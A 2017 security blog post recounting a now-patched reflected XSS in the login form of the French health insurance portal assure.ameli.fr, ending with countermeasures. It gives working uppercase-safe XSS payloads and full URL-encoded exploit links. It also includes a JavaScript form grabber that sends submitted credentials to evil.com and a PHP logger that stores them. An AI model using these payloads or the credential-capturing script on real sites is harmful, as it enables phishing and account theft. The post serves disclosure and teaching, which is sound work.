---
layout: post
title:  "A fun case of XSS and other web concepts"
date:   2017-07-25
category: Web Security
excerpt_separator: <!--more-->
---
Hello folks,  
  
I would like to share with you a practical case of reflected XSS while i was looking at my national health service account. Right now the XSS has been patched (we have an efficient dedicated national service where we can report such issues).
<!--more-->  
  
**What is the issue ?**  
  
A reflected [XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)) in the login field at the authentication page from the website https://assure.ameli.fr where all french citizen are consulting their social security account. Some digits are required but setting some alphacharacters as login will return the string in uppercase.  
  
**Where is the issue ?**  
  
So i set:  
![image1]({{ site.url }}/public/images/xss-practical-case/image1.png)  
  
And i got:  
```html
<form name="connexionCompteForm" id="connexioncompte_2connexionCompteForm" method="post" action="https://assure.ameli.fr:443/PortailAS/appmanager/PortailAS/assure?_nfpb=true&amp;_windowLabel=connexioncompte_2&amp;connexioncompte_2_actionOverride=%2Fportlets%2Fconnexioncompte%2Fvalidationconnexioncompte&amp;_pageLabel=as_login_page" class="r_cnx_form">
...
<input id="connexioncompte_2nir_as" type="text" value="THEPOSTLOGIN" maxlength="13" size="13" placeholder="Mon numéro de sécurité sociale" title="Mon numéro de sécurité sociale" tabindex="3" name="connexioncompte_2numSecuriteSociale" />
...
</form>
```  
  
Let's try something else with the login **toto<>"'();/\:**:  
```
<input id="connexioncompte_2nir_as" type="text" value="TOTO<>"'();/\" maxlength="13" ...
```
  
No escaping, no sanitizing or HTML encoding but we will have to deal with UPPERCASE. **HTML is not case sensitive but javascript is**, so we will do some HEX encoding for the javascript part.  
  
An important thing i forgot to mention is that the payload is **truncated to 255 characters**.  
  
So this is **how to exploit an XSS when your payload is UPPERCASED (and truncated):**  
  
**First payload:**  
We can test the XSS thanks to this payload (alert):  
```
https://assure.ameli.fr/PortailAS/appmanager/PortailAS/assure?connexioncompte_2numSecuriteSociale=" /><IMG SRC=X ONERROR=&#x61;&#x6C;&#x65;&#x72;&#x74;(&#x64;&#x6F;&#x63;&#x75;&#x6D;&#x65;&#x6E;&#x74;&#x2E;&#x64;&#x6F;&#x6D;&#x61;&#x69;&#x6E;) hidden><nimp "&connexioncompte_2codeConfidentiel=&connexioncompte_2actionEvt=connecter
```
  
Full payload url encoded:  
```
https://assure.ameli.fr/PortailAS/appmanager/PortailAS/assure?connexioncompte_2numSecuriteSociale=%22%20%2F%3E%3CIMG%20SRC%3DX%20ONERROR%3D%26%23x61%3B%26%23x6C%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B(%26%23x64%3B%26%23x6F%3B%26%23x63%3B%26%23x75%3B%26%23x6D%3B%26%23x65%3B%26%23x6E%3B%26%23x74%3B%26%23x2E%3B%26%23x64%3B%26%23x6F%3B%26%23x6D%3B%26%23x61%3B%26%23x69%3B%26%23x6E%3B)%20hidden%3E%3Cnimp%20%22&connexioncompte_2codeConfidentiel=&connexioncompte_2actionEvt=connecter
```
  
*But wait... you process a GET request and you were talking about a form with POST method ?*  
Yes, there but there is no server-side filtering on the specific POST method (*of course it's also exploitable with POST*).  
  
So what do we have ?:  
![image2]({{ site.url }}/public/images/xss-practical-case/image2.png)  
  
It works because i'm using Firefox. IE and Chrome embed a reflected XSS auditor which prevents this kind of inline javascript execution.  
  
Now how to deal with a truncated payload ?:  
Easy, we just have to call an external javascript file.  
  
**Final payload:**  
```
" name="connexioncompte_2numSecuriteSociale" placeholder="&#x4d;&#x6f;&#x6e;&#x20;&#x6e;&#x75;&#x6d;&#xe9;&#x72;&#x6f;&#x20;&#x64;&#x65;&#x20;&#x73;&#xe9;&#x63;&#x75;&#x72;&#x69;&#x74;&#xe9;&#x20;&#x73;&#x6f;&#x63;&#x69;&#x61;&#x6c;&#x65;" /><script src='https://evil.com/poc/poc.js'></script><nimp "
```  
  
Final payload url encoded:  
```
https://assure.ameli.fr/PortailAS/appmanager/PortailAS/assure?connexioncompte_2numSecuriteSociale=%22%20name%3D%22connexioncompte_2numSecuriteSociale%22%20placeholder%3D%22%26%23x4d%3B%26%23x6f%3B%26%23x6e%3B%26%23x20%3B%26%23x6e%3B%26%23x75%3B%26%23x6d%3B%26%23xe9%3B%26%23x72%3B%26%23x6f%3B%26%23x20%3B%26%23x64%3B%26%23x65%3B%26%23x20%3B%26%23x73%3B%26%23xe9%3B%26%23x63%3B%26%23x75%3B%26%23x72%3B%26%23x69%3B%26%23x74%3B%26%23xe9%3B%26%23x20%3B%26%23x73%3B%26%23x6f%3B%26%23x63%3B%26%23x69%3B%26%23x61%3B%26%23x6c%3B%26%23x65%3B%22%20%2F%3E%3Cscript%20src%3D%27https%3A%2F%2Fevil.com%2Fpoc%2Fpoc.js%27%3E%3C%2Fscript%3E%3Cnimp%20%22&connexioncompte_2codeConfidentiel=&connexioncompte_2actionEvt=connecter
```  
   
On our web server, we are creating the web tree *POC/POC.JS* (scheme and domain name are not case sensitive). But does a little bird sing the word CORS (Cross-Origin Resource Sharing)?  
  
Here are some examples of resources which may be embedded cross-origin ([https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)):  
 - JavaScript with ```<script src="..."></script>```. Error messages for syntax errors are only available for same-origin scripts.
 - CSS with ```<link rel="stylesheet" href="...">```. Due to the relaxed syntax rules of CSS, cross-origin CSS requires a correct Content-Type header. Restrictions vary by browser: IE, Firefox, Chrome, Safari (scroll down to CVE-2010-0051) and Opera.
 - Images with ```<img>```. Supported image formats include PNG, JPEG, GIF, BMP, SVG, ...
 - Media files with ```<video>``` and ```<audio>```.
 - Plug-ins with ```<object>```, ```<embed>``` and ```<applet>```.
 - Fonts with ```@font-face```. Some browsers allow cross-origin fonts, others require same-origin fonts.
 - Anything with ```<frame>``` and ```<iframe>```. A site can use the X-Frame-Options header to prevent this form of cross-origin interaction.
  
But in fact whatever... we are owning the web server we would be able to add if it was necessary the response header ```access-control-allow-origin: *``` for any resources.  
  
But what kind of cool javascript payload can we inject? (knowing that the ```JSESSIONID``` cookie has the flag ```HttpOnly```, so not accessible via javascript).  
  
![image3]({{ site.url }}/public/images/xss-practical-case/image3.png)  
  
**We will add a callback function that will be triggered once the forms on the webpage will be submitted** (allowing us to capture the credentials).  
Check [https://github.com/phackt/pentest/tree/master/exploits/js_keylogger](https://github.com/phackt/pentest/tree/master/exploits/js_keylogger) for source code.  
  
**POC.JS**  
```javascript
window.onload = function () {
	for(var i=0; i<document.forms.length; i++){
	  	document.forms[i].addEventListener("submit", function() {
	  		for(e=0; e<this.elements.length; e++){
	  			keys = "[name:" + this.elements[e].name + ",value:" + this.elements[e].value + ",type:" + this.elements[e].type + "]";
	  			new Image().src = 'https://evil.com/key.php?c='+keys;
	  		}
    	}, false);
	}
}
```
  
**key.php**  
```php
<?php
if(!empty($_GET['c'])) {
    $logfile = fopen('data.txt', 'a+');
    fwrite($logfile, $_GET['c']."\n");
    fclose($logfile);
}
?>
```  
  
So suppose you are receiving a link which exploits the XSS vulnerability and you innocently enter your credentials to check your account, the attacker will receive:  
```
[name:CONNEXIONCOMPTE_2NUMSECURITESOCIALE,value:1234567890123,type:text]
[name:connexioncompte_2codeConfidentiel,value:89769874,type:password]
[name:connexioncompte_2actionEvt,value:connecter,type:hidden]
[name:submit,value:Valider,type:submit]
```  
  
This kind of vulnerability could be part of a **phishing campaign** which encourages people to log in by clicking on the malicious link.  
  
**COUNTERMEASURES**:  
 - HTML Encoding (HTML entities and numeric character references) - [https://en.wikipedia.org/wiki/Character_encodings_in_HTML](https://en.wikipedia.org/wiki/Character_encodings_in_HTML)
 - Sanitizing
 - Escaping
 - White-listing
 - Block inline javascript via CSP (*X-XSS-Protection is deprecated and will be replaced by the [CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) directive Reflected-XSS*)
  
Dealing with external resources, blocking all cross domains requests via a Content Security Policy rule may be not relevant because a lot of these resources are legitimate on a website.  
However we can do some subtle CSP rules in order to allow only what is needed.  

But if a web site administrator wants to allow only resources from the *same origin* (this excludes subdomains):  
```
Content-Security-Policy: default-src 'self'
```
  
Web applications are really interesting because of all the concepts you have to deal with.  
  
Hope you enjoyed.  
  
Phackt.
